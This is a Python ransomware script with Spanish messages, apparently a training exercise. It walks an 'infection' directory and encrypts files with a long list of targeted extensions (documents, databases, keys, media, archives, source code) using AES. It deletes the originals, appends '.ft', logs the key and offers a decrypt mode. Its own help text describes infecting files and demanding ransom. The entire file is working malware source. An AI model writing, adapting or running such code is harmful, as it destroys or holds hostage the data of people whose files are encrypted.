import os
import argparse
import string
import pyAesCrypt


extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
                ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
                ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs",
                ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg",
                ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw",
                ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx",
                ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb",
                ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb",
                ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"] #



def encrypt_file(file_path, key):
    if os.path.isfile(file_path):
        encrypted_file_path = file_path + '.ft'
        pyAesCrypt.encryptFile(file_path, encrypted_file_path, key)
        os.remove(file_path)


def encrypt_directory(directory_path, key, silent=False):
    for root, subdir, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            extension = os.path.splitext(file_path)[1].lower()
            if extension in extensiones:
                encrypt_file(file_path, key)
            if not silent:
                print(f"Encrypted: {file_path}")


def decrypt_file(file_path, key):
    decrypted_file_path = file_path[:-3]
    try:
        pyAesCrypt.decryptFile(file_path, decrypted_file_path, key)
        os.remove(file_path)
    except:
        print("Error: La clave de desencriptado no es correcta.")


def decrypt_directory(directory_path, key, silent=False):
    for root, subdir, files in os.walk(directory_path):
        for file in files:
            if file.endswith('.ft'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)
                if not silent:
                    print(f"Decrypted: {file_path}")


def encrypt_infection_directory(directory_path, key, silent=False):
    if not silent:
        print("Encrypting files...")
    encrypt_directory(directory_path, key, silent)
    if not silent:
        print("Encryption completed.")


def decrypt_infection_directory(directory_path, key, silent=False):
    if not silent:
        print("Decrypting files...")
    decrypt_directory(directory_path, key, silent)
    if not silent:
        print("Decryption completed.")


def get_program_version():
    return "Version 1.0"

def save_key_to_file(key):
    with open('keys.txt', 'a') as file:
        file.write(key + '\n')

def main():
    parser = argparse.ArgumentParser(description='Programa para infectar archivos de un directorio y encriptarlos. Pedir rescate con 2 cojones!!')
    parser.add_argument('-s', '--silent', action='store_true', help='Ejecuta el programa en modo silencioso')
    parser.add_argument('-r', '--decrypt', action='store_true', help='Desencripta los archivos infectados')
    parser.add_argument('-v', '--version', action='store_true', help='Muestra la version del programa')
    parser.add_argument('key', nargs='?', type=str, default='', help='clave de encriptado (tiene que tener más de 16 caracteres)')
    args = parser.parse_args()

    if args.version:
        print(get_program_version())
        return
    if not args.key:
        print('Error: La clave de encriptado es necesaria.')
        return
    if len(args.key) < 16:
        print('Error: La clave de encriptado tiene que tener como minimo 16 caracteres.')
        return
    if any(char not in string.printable for char in args.key):
        print('Error: La clave de encriptado contiene caracteres no permitidos.')
        return
    if not args.decrypt:
        encrypt_infection_directory(os.getcwd() + '/infection', args.key, args.silent)
        save_key_to_file(args.key)
    else:
        decrypt_infection_directory(os.getcwd() + '/infection', args.key, args.silent)



if __name__ == '__main__':
    main()
